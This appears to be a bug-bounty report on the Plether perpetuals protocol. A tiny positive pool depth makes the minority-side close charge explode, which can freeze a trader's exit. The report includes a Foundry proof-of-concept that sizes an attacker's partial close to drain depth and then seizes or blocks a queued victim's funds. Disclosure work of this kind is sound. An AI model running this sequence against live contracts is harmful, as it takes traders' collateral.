# \#99944 [SC-High] Tiny positive pool depth can prevent a trader's exit

**Submitted on Nov 15th 2026 at 20:07:33 UTC by @gandu for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99944
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro
A profitable partial close can reduce pool pricing depth to a few USDG without taking it to zero. The next minority-side close then receives an extreme VPI charge. If the affected trader enforces a charge limit, the close fails; in the tested degraded state, the trader cannot withdraw free collateral seven days later.

## Vulnerability Details
1. Fresh close VPI depends on the change in squared skew divided by economic pool depth.
2. The relevant depth is physical pool assets net of trader claims at execution time.
3. CloseAccountingLib has a special case for exactly zero depth: it does not create a fresh VPI charge or rebate.
4. Any positive depth still enters the ordinary calculation, even if the denominator is only a few USDG.
5. There is no lower bound on that denominator and no general positive VPI cap tied to the notional being closed.
6. A winning trader can size a partial close so its cash payout fits just below available pool cash. The payout leaves a small positive depth without creating a trader claim.
7. If another trader's minority-side close follows in the FIFO order, the tiny denominator produces a charge far larger than that close's notional.
8. With a permissive financial limit, the close planner collects what it can from the affected trader's position proceeds, reserves, margin, and free settlement balance.
9. With a 1,000 USDG action-charge limit, the affected close instead fails with ConstraintViolation; that limit prevents the direct debit.
10. The tested pool remains in degraded mode, which also blocks withdrawal of free settlement. The test observes a rejection seven days later; recapitalization or another state change could resolve it.

~~~solidity
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets,
        inputs.poolDepthAssets, inputs.vpiFactor
    );
}
~~~

## Impact Details
The PoC leaves 15.204759 USDG of depth after the winning partial close. A subsequent 7,000 USDG notional close previews 982,915.940989 USDG of fresh VPI. In a permissive-limit branch, the protocol transfers 59,987.791451 USDG from the affected trader's account to the pool, including 54,999.800000 USDG of idle settlement; the matched close before the depth reduction would instead credit 1,730.466150 USDG. The confirmed High impact selection is the bounded branch: its charge limit prevents that debit, but its close fails and a withdrawal still reverts after seven days in the tested state. Permanent freezing is not claimed.

## Proof of Concept

## Proof of Concept
Place PoC_DustDepthVpiClose.t.sol at packages/perps/test/poc/. The tests compare pricing before and after depth reduction, execute the FIFO partial-close sequence, inspect actual trader and pool balances, and repeat the affected close with a 1,000 USDG limit. No in-scope source contract is changed.

~~~bash
forge test --root packages/perps --offline --match-path 'test/poc/PoC_DustDepthVpiClose.t.sol' -vv
~~~

The submitted report records 2 passed, 0 failed. This suite was not rerun for this rewrite.


```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";

/// @notice Public-path reproduction of a minority close's uncapped VPI at shallow LP depth.
contract PoC_DustDepthVpiClose is BasePerpTest {

    address internal constant SHORT = address(0x5001);
    address internal constant VICTIM = address(0x5002);
    address internal constant KEEPER = address(0x5003);
    address internal constant ATTACKER = address(0x5004);
    uint256 internal constant PRICE = 180_000_000;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8_000);
        _fundJunior(address(this), 10_000_000e6);
        _fundTrader(SHORT, 500_000e6);
        _fundTrader(VICTIM, 50_000e6);
        _mark(PRICE);
    }

    function _mark(
        uint256 price
    ) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.updateMarkPrice(data);
    }

    function _order(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool close
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        return _orderAt(account, side, size, margin, close, PRICE);
    }

    function _orderAt(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool close,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint64 id = _commit(account, side, size, margin, close);
        return _execute(id, price);
    }

    function _commit(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool close
    ) internal returns (uint64 id) {
        return _commitBounded(account, side, size, margin, close, type(uint256).max);
    }

    function _commitBounded(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool close,
        uint256 maxAction
    ) internal returns (uint64 id) {
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == close ? type(uint256).max : 1,
            isClose: close,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(window),
                executionWindowSeconds: window,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: maxAction,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        id = router.commitOrder(request);
    }

    function _execute(
        uint64 id,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        result = router.executeOrder(id, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    function _bestDrainingChunk(
        uint256 dustTarget
    ) internal view returns (uint256 size, uint256 payout) {
        uint256 available = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        (uint256 positionSize,,,,,,) = engine.positions(ATTACKER);
        uint256 lo;
        uint256 hi = positionSize / 100e18 - 1;
        while (lo < hi) {
            uint256 mid = (lo + hi + 1) / 2;
            ICfdEngineTypes.ClosePreview memory p = engineLens.previewClose(ATTACKER, mid * 100e18, 140_000_000);
            if (p.valid && p.deferredPayoutAssets == 0 && p.immediatePayoutAssets <= available - dustTarget) {
                lo = mid;
            } else {
                hi = mid - 1;
            }
        }
        ICfdEngineTypes.ClosePreview memory best = engineLens.previewClose(ATTACKER, lo * 100e18, 140_000_000);
        assertTrue(best.valid && best.deferredPayoutAssets == 0);
        size = lo * 100e18;
        payout = best.immediatePayoutAssets;
    }

    function _redeemToTarget(
        uint256 markPrice,
        uint256 targetAssets
    ) internal {
        vm.warp(vm.getBlockTimestamp() + 2 hours);
        _mark(markPrice);
        uint256 maxShares = juniorVault.maxRequestRedeem(address(this));
        (,,, uint256 cap) = pool.getPendingTrancheState();
        uint256 desired = pool.totalAssets() - targetAssets;
        assertLe(desired, cap, "target must be within LP cap");
        uint256 shares = juniorVault.estimateWithdrawShares(desired);
        if (shares > maxShares) {
            shares = maxShares;
        }
        uint256 requestId = juniorVault.requestRedeem(shares, address(this), address(this));
        vm.warp(pool.lpEpochStart(requestId));
        _mark(markPrice);
        vm.prank(KEEPER);
        router.settleLpEpoch(_mockPythUpdateData(markPrice));
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, address(this));
        assertGt(claimable, 0);
        juniorVault.claimRedeem(requestId, claimable, address(this), address(this));
    }

    function _redeemToLimit() internal {
        vm.warp(vm.getBlockTimestamp() + 2 hours);
        _mark(PRICE);
        uint256 maxShares = juniorVault.maxRequestRedeem(address(this));
        assertGt(maxShares, 0, "LP matured");
        (,,, uint256 maxJuniorWithdrawAssets) = pool.getPendingTrancheState();
        emit log_named_decimal_uint("maximum junior withdrawal", maxJuniorWithdrawAssets, 6);
        // Leave enough headroom for the opposing opening's extra settlement buffer.
        uint256 shares = juniorVault.estimateWithdrawShares(maxJuniorWithdrawAssets - 25_000e6);
        if (shares > maxShares) {
            shares = maxShares;
        }
        uint256 requestId = juniorVault.requestRedeem(shares, address(this), address(this));
        vm.warp(pool.lpEpochStart(requestId));
        _mark(PRICE);
        vm.prank(KEEPER);
        router.settleLpEpoch(_mockPythUpdateData(PRICE));
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, address(this));
        assertGt(claimable, 0, "LP exit funded");
        juniorVault.claimRedeem(requestId, claimable, address(this), address(this));
        emit log_named_decimal_uint("depth after public LP withdrawal", pool.totalAssets(), 6);
    }

    function test_NonDegradedMinorityCloseConsumesIdleCollateralAfterLpExit() public {
        _order(SHORT, CfdTypes.Side.SHORT, 2_000_000e18, 200_000e6, false);
        uint256 healthyDepth = pool.totalAssets();
        uint256 snapshot = vm.snapshotState();
        _order(VICTIM, CfdTypes.Side.LONG, 100_000e18, 3600e6, false);
        uint256 healthyBefore = clearinghouse.balanceAssets(VICTIM);
        _order(VICTIM, CfdTypes.Side.LONG, 100_000e18, 0, true);
        uint256 healthyDebit = healthyBefore - clearinghouse.balanceAssets(VICTIM);
        assertTrue(vm.revertToState(snapshot));
        vm.deleteStateSnapshot(snapshot);

        _redeemToLimit();
        uint256 shallowDepth = pool.totalAssets();
        assertLt(shallowDepth, healthyDepth / 10, "redemption must shrink depth");
        assertFalse(engine.degradedMode());
        _order(VICTIM, CfdTypes.Side.LONG, 100_000e18, 3600e6, false);
        uint256 victimBefore = clearinghouse.balanceAssets(VICTIM);
        uint256 victimFreeBefore = clearinghouse.getFreeBuyingPowerAssets(VICTIM);
        uint256 poolBefore = pool.totalAssets();
        _order(VICTIM, CfdTypes.Side.LONG, 100_000e18, 0, true);
        uint256 victimAfter = clearinghouse.balanceAssets(VICTIM);
        uint256 shallowDebit = victimBefore - victimAfter;
        emit log_named_decimal_uint("healthy depth", healthyDepth, 6);
        emit log_named_decimal_uint("shallow depth", shallowDepth, 6);
        emit log_named_decimal_uint("healthy victim close debit", healthyDebit, 6);
        emit log_named_decimal_uint("shallow victim close debit", shallowDebit, 6);
        emit log_named_decimal_uint("victim idle before shallow close", victimFreeBefore, 6);
        emit log_named_decimal_uint("pool gained from shallow close", pool.totalAssets() - poolBefore, 6);
        assertGt(shallowDebit, healthyDebit * 4, "same close charge scales with inverse depth");
        assertGt(shallowDebit, 3600e6, "charge exceeds position margin");
        assertFalse(engine.degradedMode());
        (uint256 remaining,,,,,,) = engine.positions(VICTIM);
        assertEq(remaining, 0);
    }

    function test_DeficitWinnerCanDrainDepthBeforeMinorityClose() public {
        _mark(1e8);
        _fundTrader(ATTACKER, 100_000e6);
        _fundTrader(VICTIM, 10_000e6);
        _orderAt(SHORT, CfdTypes.Side.SHORT, 2_000_000e18, 200_000e6, false, 1e8);
        _orderAt(VICTIM, CfdTypes.Side.SHORT, 5000e18, 5000e6, false, 1e8);
        _mark(190_000_000);
        _orderAt(ATTACKER, CfdTypes.Side.LONG, 600_000e18, 30_000e6, false, 190_000_000);
        _redeemToTarget(190_000_000, 2_020_000e6);
        emit log_named_decimal_uint("pool after LP exit", pool.totalAssets(), 6);
        _orderAt(SHORT, CfdTypes.Side.SHORT, 2_000_000e18, 0, true, 190_000_000);
        emit log_named_decimal_uint("pool after initial SHORT winner", pool.totalAssets(), 6);
        emit log_named_decimal_uint("claims after initial SHORT winner", engine.totalTraderClaimBalanceAssets(), 6);
        emit log_named_uint("degraded", engine.degradedMode() ? 1 : 0);
        _mark(140_000_000);
        emit log_named_decimal_uint("victim balance before", clearinghouse.balanceAssets(VICTIM), 6);
        emit log_named_decimal_uint("victim idle before", clearinghouse.getFreeBuyingPowerAssets(VICTIM), 6);
        emit log_named_decimal_uint("attacker balance before", clearinghouse.balanceAssets(ATTACKER), 6);
        emit log_named_decimal_uint("pool before attacker close", pool.totalAssets(), 6);
        uint256 state = vm.snapshotState();
        uint256 victimControlBefore = clearinghouse.balanceAssets(VICTIM);
        _orderAt(VICTIM, CfdTypes.Side.SHORT, 5000e18, 0, true, 140_000_000);
        uint256 victimControlAfter = clearinghouse.balanceAssets(VICTIM);
        assertGt(victimControlAfter, victimControlBefore, "same close is profitable before depth drain");
        emit log_named_decimal_uint("victim close proceeds without drain", victimControlAfter - victimControlBefore, 6);
        assertTrue(vm.revertToState(state));
        vm.deleteStateSnapshot(state);

        (uint256 chunk, uint256 previewPayout) = _bestDrainingChunk(1e6);
        emit log_named_decimal_uint("chosen partial close size tokens", chunk / 1e18, 0);
        emit log_named_decimal_uint("preview partial close cash", previewPayout, 6);
        uint256 attackStartState = vm.snapshotState();
        _orderAt(ATTACKER, CfdTypes.Side.LONG, chunk, 0, true, 140_000_000);
        (uint256 controlRemaining,,,,,,) = engine.positions(ATTACKER);
        _orderAt(ATTACKER, CfdTypes.Side.LONG, controlRemaining, 0, true, 140_000_000);
        uint256 controlClaim = engine.traderClaimBalanceAssets(ATTACKER);
        uint256 controlWithdrawable = clearinghouse.getFreeBuyingPowerAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, controlWithdrawable);
        uint256 controlWallet = settlementToken.balanceOf(ATTACKER);
        assertTrue(vm.revertToState(attackStartState));
        vm.deleteStateSnapshot(attackStartState);

        uint256 boundedState = vm.snapshotState();
        uint64 boundedAttackerId = _commit(ATTACKER, CfdTypes.Side.LONG, chunk, 0, true);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint64 boundedVictimId = _commitBounded(VICTIM, CfdTypes.Side.SHORT, 5000e18, 0, true, 1000e6);
        _execute(boundedAttackerId, 140_000_000);
        OrderV3Types.ExecutionResult memory bounded =
            router.executeOrder(boundedVictimId, _mockPythUpdateData(140_000_000));
        assertEq(uint8(bounded.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(bounded.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        (uint256 boundedPosition,,,,,,) = engine.positions(VICTIM);
        assertEq(boundedPosition, 5000e18, "bounded close leaves victim exposed");
        vm.warp(vm.getBlockTimestamp() + 7 days);
        vm.prank(VICTIM);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
        clearinghouse.withdraw(VICTIM, 1e6);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();
        assertTrue(vm.revertToState(boundedState));
        vm.deleteStateSnapshot(boundedState);

        uint64 attackerOrderId = _commit(ATTACKER, CfdTypes.Side.LONG, chunk, 0, true);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint64 victimOrderId = _commit(VICTIM, CfdTypes.Side.SHORT, 5000e18, 0, true);
        uint256 victimBefore = clearinghouse.balanceAssets(VICTIM);
        assertGt(clearinghouse.getFreeBuyingPowerAssets(VICTIM), 54_000e6, "idle funds are not position margin");
        _execute(attackerOrderId, 140_000_000);
        uint256 dustDepth = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        emit log_named_decimal_uint("depth before victim's queued close", dustDepth, 6);
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "winner's partial close is paid in cash");
        assertGt(dustDepth, 0);
        assertLt(dustDepth, 50e6);
        ICfdEngineTypes.ClosePreview memory dustQuote = engineLens.previewClose(VICTIM, 5000e18, 140_000_000);
        assertTrue(dustQuote.valid, "full close remains executable at positive dust depth");
        assertGt(dustQuote.vpiAssets, victimBefore, "fresh VPI exceeds the entire victim account");
        emit log_named_decimal_uint("fresh victim close VPI at dust depth", dustQuote.vpiAssets, 6);
        uint256 poolBeforeVictim = pool.totalAssets();
        _execute(victimOrderId, 140_000_000);
        uint256 victimAfter = clearinghouse.balanceAssets(VICTIM);
        emit log_named_decimal_uint("victim balance after queued close", victimAfter, 6);
        emit log_named_decimal_uint("victim balance taken", victimBefore - victimAfter, 6);
        emit log_named_decimal_uint("pool inflow from victim close", pool.totalAssets() - poolBeforeVictim, 6);
        assertEq(victimAfter, 0, "victim's entire clearinghouse account is consumed");
        assertEq(engine.traderClaimBalanceAssets(VICTIM), 0, "no replacement claim is issued");
        assertEq(pool.totalAssets() - poolBeforeVictim, victimBefore - victimAfter, "victim funds enter pool");
        (uint256 secondChunk,) = _bestDrainingChunk(1e6);
        _orderAt(ATTACKER, CfdTypes.Side.LONG, secondChunk, 0, true, 140_000_000);
        (uint256 attackRemaining,,,,,,) = engine.positions(ATTACKER);
        _orderAt(ATTACKER, CfdTypes.Side.LONG, attackRemaining, 0, true, 140_000_000);
        uint256 attackClaim = engine.traderClaimBalanceAssets(ATTACKER);
        uint256 attackWithdrawable = clearinghouse.getFreeBuyingPowerAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, attackWithdrawable);
        uint256 attackWallet = settlementToken.balanceOf(ATTACKER);
        emit log_named_decimal_uint("control attacker withdrawable wallet", controlWallet, 6);
        emit log_named_decimal_uint("attack attacker withdrawable wallet", attackWallet, 6);
        emit log_named_decimal_uint("control attacker claim", controlClaim, 6);
        emit log_named_decimal_uint("attack attacker claim", attackClaim, 6);
        assertGt(attackWallet, controlWallet + 50_000e6, "victim's cash is withdrawable by attacker");
        assertLt(attackClaim + 50_000e6, controlClaim, "attacker's unbacked claim falls");
        assertApproxEqAbs(
            attackWallet - controlWallet,
            controlClaim - attackClaim,
            1e6,
            "cash increase comes from advancing the winner's claim"
        );
    }

}

```

